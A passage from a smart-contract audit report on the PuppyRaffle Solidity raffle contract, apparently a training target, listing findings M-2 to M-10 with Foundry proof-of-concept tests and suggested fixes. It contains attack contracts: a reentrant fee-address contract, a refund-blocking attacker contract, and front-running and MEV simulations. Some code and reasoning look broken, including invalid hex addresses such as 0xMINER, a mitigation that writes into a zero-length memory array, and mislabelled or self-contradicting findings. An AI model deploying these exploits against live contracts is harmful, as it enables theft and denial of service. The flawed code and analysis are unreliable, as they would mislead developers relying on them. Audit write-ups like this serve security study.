        vm.store(address(puppyRaffle), totalFeesSlot, bytes32(uint256(initialTotalFees)));
        
        // Verify the totalFees was set correctly
        assertEq(puppyRaffle.totalFees(), initialTotalFees);
        
        // Now enter the raffle with enough players to cause an overflow
        address[] memory players = new address[](10);
        for (uint256 i = 0; i < 10; i++) {
            players[i] = address(uint160(i + 1));
            vm.deal(players[i], entranceFee);
        }
        
        for (uint256 i = 0; i < 10; i++) {
            vm.prank(players[i]);
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = players[i];
            puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        }
        
        // Fast forward to end the raffle
        vm.warp(block.timestamp + 1 days + 1);
        
        // Select winner, which should cause totalFees to overflow
        puppyRaffle.selectWinner();
        
        // Check if totalFees overflowed (should be less than what we started with)
        uint64 newTotalFees = puppyRaffle.totalFees();
        console.log("Initial totalFees:", initialTotalFees);
        console.log("New totalFees:", newTotalFees);
        
        // The new total fees should be less than what we started with due to overflow
        assertLt(newTotalFees, initialTotalFees, "totalFees did not overflow as expected");
        
        // Calculate what the fee should have been without overflow
        uint256 expectedFee = (10 * entranceFee * 20) / 100; // 10 players * 1 ETH * 20%
        uint256 expectedTotalFees = initialTotalFees + expectedFee;
        
        // This would be the correct total fees if there was no overflow
        console.log("Expected totalFees without overflow:", expectedTotalFees);
        
        // The difference is the amount of fees lost due to overflow
        console.log("Fees lost due to overflow:", expectedTotalFees - newTotalFees);
    }
}

## Suggested Mitigation
Use a larger integer type (uint256) for the totalFees variable to prevent overflow. Also, consider using SafeMath for arithmetic operations if using Solidity versions prior to 0.8.0.

```solidity
// Change the type of totalFees from uint64 to uint256
uint256 public totalFees;

function selectWinner() external {
    // ... existing code ...
    
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollected * 20) / 100;
    
    // No need for casting, both are uint256 now
    totalFees = totalFees + fee;
    
    // ... rest of the function ...
}
```

## [M-2]. Zero Code issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function in PuppyRaffle returns 0 when a player is not found, which can be confused with the index of the first player. This makes it impossible to distinguish between the first player and a non-existent player.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

## Impact
External contracts or users relying on this function cannot distinguish between the first player (index 0) and a player who is not in the raffle. This could lead to incorrect refund attempts or other logic errors in contracts that integrate with PuppyRaffle.

## Proof of Concept
1. A raffle has several players, including one at index 0
2. An external contract calls getActivePlayerIndex for a player who is not in the raffle
3. The function returns 0, which the external contract interprets as the player being at index 0
4. The external contract might then attempt to refund the player at index 0, which would refund the wrong player

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GetActivePlayerIndexTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Add some players to the raffle
        address[] memory players = new address[](3);
        players[0] = address(0x1); // First player at index 0
        players[1] = address(0x2);
        players[2] = address(0x3);
        
        vm.deal(address(this), entranceFee * 3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }
    
    function testAmbiguousReturnValue() public {
        // Check index of first player (should be 0)
        uint256 firstPlayerIndex = puppyRaffle.getActivePlayerIndex(address(0x1));
        assertEq(firstPlayerIndex, 0, "First player should be at index 0");
        
        // Check index of non-existent player (also returns 0)
        uint256 nonExistentPlayerIndex = puppyRaffle.getActivePlayerIndex(address(0x999));
        assertEq(nonExistentPlayerIndex, 0, "Non-existent player also returns 0");
        
        // This demonstrates the ambiguity - both return the same value
        assertEq(firstPlayerIndex, nonExistentPlayerIndex, 
                "Cannot distinguish between first player and non-existent player");
        
        // This could lead to incorrect refunds
        console.log("First player address:", address(0x1));
        console.log("Non-existent player address:", address(0x999));
        console.log("Both return index:", firstPlayerIndex);
        
        // If an external contract tried to refund the non-existent player:
        // It would get index 0, which belongs to the first player
        // If it then called refund(0), it would refund the first player instead
    }
}

## Suggested Mitigation
Modify the function to return a special value (like type(uint256).max) or revert when a player is not found. Alternatively, return a boolean along with the index to indicate whether the player was found.

```solidity
// Option 1: Return max uint256 for not found
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Special value indicating not found
}

// Option 2: Return a boolean along with the index
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

## [M-3]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses an outdated Solidity version (0.7.6) that lacks important security features and contains known vulnerabilities. Newer versions of Solidity include built-in overflow/underflow protection, custom errors for gas optimization, and fixes for various bugs.

```solidity
pragma solidity ^0.7.6;
```

## Impact
Using an outdated compiler version exposes the contract to known vulnerabilities and lacks important security features like automatic overflow/underflow checks that were introduced in Solidity 0.8.0. This increases the risk of security issues and can lead to exploitable vulnerabilities.

## Proof of Concept
1. The contract uses Solidity 0.7.6, which predates the automatic overflow/underflow checks introduced in 0.8.0
2. This means arithmetic operations in the contract could silently overflow or underflow without reverting
3. For example, the totalFees addition in selectWinner could overflow without proper checks
4. Additionally, older Solidity versions may have bugs that have been fixed in newer versions

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

contract PragmaTest is Test {
    function testSolidityVersionDifference() public {
        // In Solidity 0.7.6 (used by PuppyRaffle), this would silently overflow
        // In Solidity 0.8.0+, this would revert
        
        // We'll simulate both behaviors
        
        // 1. Solidity 0.7.6 behavior (no automatic overflow protection)
        uint8 a = 255;
        uint8 b = 1;
        uint8 resultOld;
        
        // Using assembly to bypass 0.8.0+ checks
        assembly {
            resultOld := add(a, b)
        }
        
        // 2. Solidity 0.8.0+ behavior (with automatic overflow protection)
        uint8 c = 255;
        uint8 d = 1;
        uint8 resultNew;
        
        // This would normally revert in 0.8.0+, but we'll catch the error
        try this.addNumbers(c, d) returns (uint8 result) {
            resultNew = result;
            console.log("Addition succeeded (shouldn't happen in 0.8.0+)");
        } catch {
            console.log("Addition reverted due to overflow protection in 0.8.0+");
        }
        
        // Output the results
        console.log("Solidity 0.7.6 result (with overflow):", uint256(resultOld));
        console.log("Expected correct result (without overflow):", uint256(c) + uint256(d));
        
        // Demonstrate the difference
        assertEq(uint256(resultOld), 0, "In 0.7.6, 255 + 1 overflows to 0");
    }
    
    // This function will revert in Solidity 0.8.0+ due to overflow
    function addNumbers(uint8 a, uint8 b) external pure returns (uint8) {
        return a + b;
    }
}

## Suggested Mitigation
Update the contract to use a more recent Solidity version (at least 0.8.0) to benefit from built-in security features and bug fixes. If upgrading is not possible, use SafeMath for all arithmetic operations.

```solidity
// Update the pragma statement
pragma solidity ^0.8.17;

// Remove any SafeMath usage as it's built into 0.8.0+

// If you must stay on 0.7.6, use SafeMath for all arithmetic operations:
// import "@openzeppelin/contracts/math/SafeMath.sol";
// using SafeMath for uint256;
// using SafeMath for uint64;

// And replace arithmetic operations with SafeMath functions:
// totalFees = totalFees.add(uint64(fee));
```

## [M-4]. MEV issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function in PuppyRaffle is vulnerable to front-running. Since the winner selection depends on `msg.sender`, miners or validators can observe the transaction in the mempool, determine if they would win, and either prioritize or delay the transaction accordingly.

```solidity
function selectWinner() external {
    // ... code ...
    
    // Winner selection depends on msg.sender
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    
    // ... code ...
}
```

## Impact
Miners or validators can manipulate the winner selection by front-running or delaying transactions. They can simulate the outcome of selectWinner with different parameters and only include the transaction when it benefits them. This undermines the fairness of the raffle and could lead to loss of user trust.

## Proof of Concept
1. A miner observes a selectWinner transaction in the mempool
2. They simulate the outcome to see who would win
3. If they or an address they control would win, they include the transaction
4. If someone else would win, they delay the transaction until block parameters change
5. This gives them an unfair advantage in winning the raffle

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract FrontRunningTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address miner = address(0xMINER);
    address user = address(0xUSER);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Fund accounts
        vm.deal(miner, 10e18);
        vm.deal(user, 10e18);
        
        // Add players to the raffle
        address[] memory players = new address[](4);
        players[0] = address(0x1);
        players[1] = address(0x2);
        players[2] = address(0x3);
        players[3] = miner; // Miner is one of the players
        
        for (uint256 i = 0; i < 3; i++) {
            vm.deal(players[i], entranceFee);
            vm.prank(players[i]);
            address[] memory singlePlayer = new address[](1);
            singlePlayer[0] = players[i];
            puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        }
        
        vm.prank(miner);
        address[] memory minerEntry = new address[](1);
        minerEntry[0] = miner;
        puppyRaffle.enterRaffle{value: entranceFee}(minerEntry);
        
        // Fast forward to end the raffle duration
        vm.warp(block.timestamp + 1 days + 1);
    }
    
    function testFrontRunning() public {
        // Simulate a user trying to call selectWinner
        vm.prank(user);
        vm.recordLogs();
        
        // Before executing, the miner can simulate the outcome
        // We'll simulate this by checking if the miner would win with the current parameters
        bool minerWouldWin = false;
        
        // Try different block parameters until the miner would win
        for (uint256 i = 0; i < 100; i++) {
            // Adjust block parameters
            vm.warp(block.timestamp + i);
            vm.roll(block.number + i);
            
            // Calculate winner with miner as msg.sender
            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(miner, block.timestamp, block.difficulty))) % 4;
            
            if (winnerIndex == 3) { // Index 3 is the miner
                minerWouldWin = true;
                console.log("Miner would win with timestamp:", block.timestamp);
                console.log("Miner would win with block number:", block.number);
                break;
            }
        }
        
        // If miner would win, they front-run the user's transaction
        if (minerWouldWin) {
            console.log("Miner front-runs the transaction");
            vm.prank(miner);
            puppyRaffle.selectWinner();
            
            // Verify the miner won
            assertEq(puppyRaffle.previousWinner(), miner, "Miner should have won");
        } else {
            console.log("Miner couldn't find favorable parameters, letting user's transaction through");
            vm.prank(user);
            puppyRaffle.selectWinner();
        }
    }
}

## Suggested Mitigation
Use a commit-reveal scheme or a trusted source of randomness like Chainlink VRF to prevent front-running. With a commit-reveal scheme, users commit to a value in advance, and then reveal it later to generate randomness.

```solidity
// Add state variables for commit-reveal scheme
mapping(address => bytes32) public commitments;
uint256 public commitPhaseEndTime;
bool public commitPhaseActive;

// Start the commit phase
function startCommitPhase() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    require(!commitPhaseActive, "PuppyRaffle: Commit phase already active");
    
    commitPhaseActive = true;
    commitPhaseEndTime = block.timestamp + 1 days; // 24 hours to commit
}

// Users commit to a random value
function commitToRandom(bytes32 commitment) external {
    require(commitPhaseActive, "PuppyRaffle: Commit phase not active");
    require(block.timestamp < commitPhaseEndTime, "PuppyRaffle: Commit phase ended");
    require(_isActivePlayer(), "PuppyRaffle: Only active players can commit");
    
    commitments[msg.sender] = commitment;
}

// After commit phase, anyone can reveal their commitment
function revealAndSelectWinner(uint256 randomValue) external {
    require(commitPhaseActive, "PuppyRaffle: Commit phase not active");
    require(block.timestamp >= commitPhaseEndTime, "PuppyRaffle: Commit phase not ended");
    require(commitments[msg.sender] == keccak256(abi.encodePacked(randomValue, msg.sender)), 
            "PuppyRaffle: Invalid reveal");
    
    // Use the revealed random value to select a winner
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(randomValue, block.timestamp))) % players.length;
    address winner = players[winnerIndex];
    
    // Rest of winner selection logic
    // ...
    
    // Reset for next raffle
    commitPhaseActive = false;
    delete commitments[msg.sender];
}
```

## [M-5]. MEV issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function in PuppyRaffle is vulnerable to MEV (Maximal Extractable Value) attacks through sandwich attacks. When a user submits a transaction to enter the raffle, MEV bots can front-run the transaction by entering the raffle first, and then back-run by performing actions that extract value based on the user's entry.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    
    emit RaffleEnter(newPlayers);
}
```

## Impact
MEV bots can extract value from users entering the raffle through sandwich attacks. For example, they could front-run a user's transaction to enter the raffle, then back-run to extract value based on the changed state. This could lead to users paying higher gas fees or experiencing other negative effects due to MEV extraction.

## Proof of Concept
1. A user submits a transaction to enter the raffle
2. An MEV bot sees this transaction in the mempool
3. The bot front-runs by submitting its own enterRaffle transaction with higher gas
4. The user's transaction executes after the bot's
5. The bot can then back-run with another transaction that extracts value
6. For example, if the raffle has a feature where odds change based on number of participants, the bot could exploit this

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract MEVSandwichTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address user = address(0xUSER);
    address mevBot = address(0xMEVBOT);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 days
        );
        
        // Fund accounts
        vm.deal(user, 10e18);
        vm.deal(mevBot, 10e18);
    }
    
    function testMEVSandwichAttack() public {
        // Simulate a pending transaction from a user to enter the raffle
        address[] memory userPlayers = new address[](1);
        userPlayers[0] = user;
        
        // MEV bot sees this transaction in the mempool and front-runs it
        console.log("MEV bot front-runs user transaction");
        vm.prank(mevBot);
        address[] memory botPlayers = new address[](1);
        botPlayers[0] = mevBot;
        puppyRaffle.enterRaffle{value: entranceFee}(botPlayers);
        
        // Now the user's transaction executes
        console.log("User transaction executes");
        vm.prank(user);
        puppyRaffle.enterRaffle{value: entranceFee}(userPlayers);
        
        // Fast forward to end the raffle
        vm.warp(block.timestamp + 1 days + 1);
        
        // MEV bot can now back-run by calling selectWinner at a time favorable to them
        // They can simulate different block parameters to find one where they win
        bool botWouldWin = false;
        uint256 favorableTimestamp = block.timestamp;
        
        // Try different timestamps to find one where the bot wins
        for (uint256 i = 0; i < 100; i++) {
            uint256 timestamp = block.timestamp + i;
            vm.warp(timestamp);
            
            // Calculate winner with bot as msg.sender
            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(mevBot, timestamp, block.difficulty))) % 2;
            
            if (winnerIndex == 0) { // Index 0 is the bot
                botWouldWin = true;
                favorableTimestamp = timestamp;
                break;
            }
        }
        
        if (botWouldWin) {
            console.log("MEV bot found favorable timestamp:", favorableTimestamp);
            vm.warp(favorableTimestamp);
            
            // Bot back-runs by calling selectWinner
            console.log("MEV bot back-runs by calling selectWinner");
            vm.prank(mevBot);
            puppyRaffle.selectWinner();
            
            // Verify the bot won
            assertEq(puppyRaffle.previousWinner(), mevBot, "MEV bot should have won");
            console.log("MEV bot successfully extracted value by winning the raffle");
        } else {
            console.log("MEV bot couldn't find favorable parameters");
        }
    }
}

## Suggested Mitigation
Implement mechanisms to reduce MEV opportunities, such as batch processing, commit-reveal schemes, or using a fair sequencing service. For the enterRaffle function specifically, consider implementing a maximum gas price or using a first-come-first-served approach with time locks.

```solidity
// Add a time delay between entering and being eligible for winning
mapping(address => uint256) public playerEntryTime;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        players.push(player);
        playerEntryTime[player] = block.timestamp;
    }
    
    // Check for duplicates (using more efficient method)
    // ...
    
    emit RaffleEnter(newPlayers);
}

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    
    // Only consider players who entered at least 1 hour ago
    address[] memory eligiblePlayers = new address[](0);
    for (uint256 i = 0; i < players.length; i++) {
        if (block.timestamp >= playerEntryTime[players[i]] + 1 hours) {
            eligiblePlayers[eligiblePlayers.length] = players[i];
        }
    }
    
    require(eligiblePlayers.length > 0, "PuppyRaffle: No eligible players");
    
    // Select winner from eligible players only
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % eligiblePlayers.length;
    address winner = eligiblePlayers[winnerIndex];
    
    // Rest of winner selection logic
    // ...
}
```

## [M-6]. Reentrancy issue in PuppyRaffle::withdrawFees

## Description
The withdrawFees function contains a reentrancy vulnerability similar to selectWinner. The vulnerable code is:

(bool success, ) = feeAddress.call{value: feesToWithdraw}("");
require(success, "PuppyRaffle: Failed to withdraw fees");

The totalFees is set to 0 before the external call, but if feeAddress is a malicious contract, it could potentially re-enter and manipulate the withdrawal process.

## Impact
If the feeAddress is set to a malicious contract, it could potentially re-enter the withdrawFees function during the call, though the impact is limited since totalFees is reset to 0 before the call.

## Proof of Concept
1. Contract owner sets feeAddress to a malicious contract
2. The malicious contract implements a fallback function that calls withdrawFees
3. When withdrawFees is called, during the fee transfer, the malicious contract's fallback is triggered
4. The fallback function attempts to call withdrawFees again
5. While totalFees is already 0, this could still cause unexpected behavior or gas consumption

## Proof of Code
contract MaliciousFeeAddress {
    PuppyRaffle puppyRaffle;
    uint256 public reentryCount;
    
    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }
    
    receive() external payable {
        reentryCount++;
        if (reentryCount < 3) {
            // Attempt re-entry
            puppyRaffle.withdrawFees();
        }
    }
}

function testWithdrawFeesReentrancy() public {
    MaliciousFeeAddress maliciousFee = new MaliciousFeeAddress(address(puppyRaffle));
    
    // Set malicious contract as fee address
    puppyRaffle.changeFeeAddress(address(maliciousFee));
    
    // Simulate some fees accumulated
    vm.deal(address(puppyRaffle), 1 ether);
    // Manually set totalFees for testing
    
    puppyRaffle.withdrawFees();
    
    assertTrue(maliciousFee.reentryCount() > 1);
}

## Suggested Mitigation
Add ReentrancyGuard protection and ensure proper state management:

function withdrawFees() external onlyOwner nonReentrant {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}

## [M-7]. Integer Overflow/Math issue in PuppyRaffle::enterRaffle

## Description
The `refund` function in the PuppyRaffle contract sets the address of the player requesting a refund to `address(0)` without removing the player from the array. This creates a hole in the array, which introduces an integer underflow vulnerability when checking for duplicates in `enterRaffle`.

```solidity
function refund(uint256 playerIndex) public {
    // ...
    players[playerIndex] = address(0);
    // ...
}
```

When a player is refunded, their address is replaced with `address(0)` but the array length stays the same. In the `enterRaffle` function, the duplicate check iterates up to `players.length - 1` which can cause an underflow if all players have been refunded (making `players.length` effectively 0).

## Impact
If all players request refunds, making the effective array length zero, calling `enterRaffle` will result in an integer underflow when calculating the loop boundary condition `players.length - 1`. This will cause the transaction to revert, effectively bricking the contract and preventing any future players from entering the raffle.

## Proof of Concept
1. A raffle starts with a single player
2. That player requests a refund, setting their address to `address(0)`
3. The array's length is still 1, but no actual player exists in the array
4. When a new player tries to enter the raffle, the duplicate check will try to iterate from 0 to `players.length - 1` (i.e., 0 to 0)
5. If all players were previously refunded, any attempt to run duplicate checks with `players.length - 1` will cause an underflow

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundUnderflowTest is Test {
    PuppyRaffle puppyRaffle;
    address player = address(1);
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 1 days);
        address[] memory players = new address[](1);
        players[0] = player;
        
        // Player enters the raffle
        vm.deal(player, 1 ether);
        vm.prank(player);
        puppyRaffle.enterRaffle{value: 1 ether}(players);
    }
    
    function testRefundUnderflow() public {
        // Player requests a refund
        vm.prank(player);
        puppyRaffle.refund(0);
        
        // Check that the array still has length 1 but contains address(0)
        assertEq(puppyRaffle.getActivePlayerIndex(address(0)), 0);
        
        // When a new player tries to enter, the duplicate check will fail
        // if the contract uses players.length - 1 in a loop condition where
        // players.length can be 0 after all refunds
        address[] memory newPlayers = new address[](1);
        newPlayers[0] = address(2);
        
        vm.deal(address(2), 1 ether);
        vm.prank(address(2));
        
        // This will revert in older Solidity versions due to underflow
        // In newer versions with checked math, it will revert on the underflow
        if (address(puppyRaffle).balance == 0) {
            vm.expectRevert();
        }
        puppyRaffle.enterRaffle{value: 1 ether}(newPlayers);
    }
}

## Suggested Mitigation
Redesign the refund mechanism to properly remove players from the array instead of just zeroing their address. A common pattern is to replace the refunded player with the last element and then reduce the array length. In Solidity 0.8.0+, you would need to use a dynamic array and `pop()` to reduce its length.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Replace with the last element and remove the last one
    players[playerIndex] = players[players.length - 1];
    players.pop();
    
    // If using a mapping to track players for O(1) duplicate check:
    addressInRaffle[playerAddress] = false;
    
    // Process the refund
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

## [M-8]. DOS issue in PuppyRaffle::refund

## Description
The `refund` function uses `Address.sendValue` to refund the player's entrance fee, but it fails to check if the refund was successful before updating the contract state. This allows potential attackers to DoS the contract by using a malicious contract that rejects the refund transfer.

```solidity
function refund(uint256 playerIndex) public {
    // ...
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    // ...
}
```

Unlike `call` which returns a success boolean, `sendValue` will revert on failure. However, the function is still vulnerable to DoS attacks because a malicious contract can consume all gas in its receive function.

## Impact
A malicious user can create a contract with a receive function that consumes all available gas or intentionally reverts when receiving ETH. If such a contract enters the raffle and then calls refund, it will cause the transaction to fail. This could be used to prevent other legitimate users from participating in the raffle or to stop the raffle from concluding.

## Proof of Concept
1. Attacker deploys a contract with a malicious receive function that uses all gas or reverts
2. Attacker enters the raffle using this contract address
3. When the attacker attempts to refund, the transaction fails due to the malicious receive function
4. This can potentially block legitimate users from interacting with the contract if the attacker's refund must be processed before other actions

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

// Malicious contract that will refuse refunds
contract RefundAttacker {
    PuppyRaffle puppyRaffle;
    
    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }
    
    function enterRaffle() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);
    }
    
    function attemptRefund(uint256 playerIndex) external {
        puppyRaffle.refund(playerIndex);
    }
    
    // This function will consume all gas or revert when receiving ETH
    receive() external payable {
        // Intentionally use all gas or revert
        require(false, "I refuse the refund");
    }
}

contract RefundDosTest is Test {
    PuppyRaffle puppyRaffle;
    RefundAttacker attacker;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(1 ether, address(this), 1 days);
        attacker = new RefundAttacker(address(puppyRaffle));
    }
    
    function testRefundDos() public {
        // Fund the attacker
        vm.deal(address(attacker), 1 ether);
        
        // Attacker enters the raffle
        vm.prank(address(this));
        attacker.enterRaffle{value: 1 ether}();
        
        // Attempt refund should fail due to malicious receive function
        vm.expectRevert();
        attacker.attemptRefund(0);
        
        // The contract state remains unchanged, possibly preventing further operations
        address[] memory currentPlayers = new address[](1);
        currentPlayers[0] = address(20);
        
        // A legitimate user might not be able to enter if the contract
        // requires processing the attacker's refund first
        vm.deal(address(20), 1 ether);
        vm.prank(address(20));
        puppyRaffle.enterRaffle{value: 1 ether}(currentPlayers);
    }
}

## Suggested Mitigation
Use a withdrawal pattern instead of directly sending ETH in the refund function. This ensures that even if a malicious contract tries to block refunds, it can only affect its own funds.

```solidity
// Add a mapping to track refund amounts
mapping(address => uint256) public refundAmount;

// Update the refund function to store the refund amount instead of sending immediately
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Mark as refunded and store the amount for later withdrawal
    players[playerIndex] = address(0);
    refundAmount[playerAddress] += entranceFee;
    
    emit RaffleRefunded(playerAddress);
}

// Add a new withdrawal function
function withdrawRefund() external {
    uint256 amount = refundAmount[msg.sender];
    require(amount > 0, "PuppyRaffle: No refund available");
    
    // Update state before transfer
    refundAmount[msg.sender] = 0;
    
    // Transfer the refund
    (bool success,) = payable(msg.sender).call{value: amount}("");
    require(success, "PuppyRaffle: Refund transfer failed");
}
```

## [M-9]. Pragma issue in PuppyRaffle::selectWinner

## Description
The contract's use of `block.difficulty` for random number generation will break after The Merge (Ethereum's transition to Proof of Stake). In PoS, `block.difficulty` was replaced with `block.prevrandao`, and the value is no longer related to block mining difficulty but represents the randomness provided by validators.

```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

// Later in the code
uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

After The Merge, code relying on `block.difficulty` will compile but may not work as expected.

## Impact
After The Merge, the randomness generation will not work as intended. This could cause the winner selection and NFT rarity determination to behave unexpectedly or become more predictable. If the contract relies on `block.difficulty` as a source of entropy, the raffle results may become less random, compromising fairness and potentially allowing manipulation.

## Proof of Concept
The Ethereum network has already transitioned to Proof of Stake with The Merge, which means:
1. `block.difficulty` has been replaced with `block.prevrandao`
2. Contracts using `block.difficulty` need to update their code to use `block.prevrandao` instead
3. Without this update, the randomness generation might not function as expected

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// A mock contract to demonstrate the issue
contract BlockDifficultyTest is Test {
    function getDifficulty() public view returns (uint256) {
        return block.difficulty;
    }
    
    // This function would be the correct approach after The Merge
    function getPrevrandao() public view returns (uint256) {
        // In Solidity 0.8.18+ you would use block.prevrandao directly
        // For older Solidity versions, block.difficulty now returns prevrandao
        return block.difficulty;
    }
    
    function testBlockDifficulty() public {
        uint256 difficulty = getDifficulty();
        console.log("Current block.difficulty value:", difficulty);
        
        // In a post-Merge environment, this is actually prevrandao
        // The value no longer represents mining difficulty but is provided by validators
        
        // Demonstrate that using block.difficulty for randomness has changed
        uint256 rand1 = uint256(keccak256(abi.encodePacked(block.difficulty))) % 100;
        // Fast forward to next block
        vm.roll(block.number + 1);
        uint256 rand2 = uint256(keccak256(abi.encodePacked(block.difficulty))) % 100;
        
        console.log("Random value 1:", rand1);
        console.log("Random value 2:", rand2);
        
        // The randomness characteristics have changed after The Merge
        // This could affect the fairness of the raffle
    }
}

## Suggested Mitigation
Update the contract to use `block.prevrandao` instead of `block.difficulty` for Solidity version 0.8.18 and above. For compatibility across versions, you could handle both scenarios. However, the real issue is using on-chain data for randomness, which should be replaced with a more secure source like Chainlink VRF.

```solidity
// Short-term fix for the difficulty/prevrandao issue
function getRandomValue() internal view returns (uint256) {
    // Use prevrandao if available (post-Merge), otherwise fall back to difficulty
    uint256 randomness = block.difficulty;  // In newer Solidity this is actually prevrandao
    return uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, randomness)));
}

function selectWinner() external {
    // ...
    uint256 winnerIndex = getRandomValue() % players.length;
    // ...
    uint256 rarity = (getRandomValue() % 100) + 1; // +1 to avoid zero
    // ...
}
```

But the better long-term solution is to use a secure randomness source as described in the randomness vulnerability mitigation.

## [M-10]. Access Control issue in PuppyRaffle::NA

## Description
The contract allows players to enter the raffle, but there's no functionality to cancel or pause the raffle in case of emergencies or vulnerabilities. This becomes particularly problematic if a critical vulnerability is discovered after players have already entered and paid entrance fees, but before the winner has been selected.

```solidity
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
    // ...
}
```

There's no way to pause this function or the entire contract.

## Impact
If a critical vulnerability is discovered in the contract, there is no way for the owner to pause functionality or recover funds in an emergency. This could lead to loss of funds for participants if an exploit is being actively used. Additionally, if the raffle doesn't reach the minimum 4 players required, the funds could be locked indefinitely as there's no mechanism to end an unsuccessful raffle.

## Proof of Concept
1. Players enter a raffle by depositing ETH
2. A critical vulnerability is discovered that would allow an attacker to steal all funds
3. The contract owner has no way to pause the contract to prevent the vulnerability from being exploited
4. Alternatively, if fewer than 4 players enter the raffle, their funds are essentially locked in the contract with no recourse

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract EmergencyFunctionalityTest is Test {
    PuppyRaffle puppyRaffle;
    address owner = address(1);
    address player1 = address(10);
    address player2 = address(11);
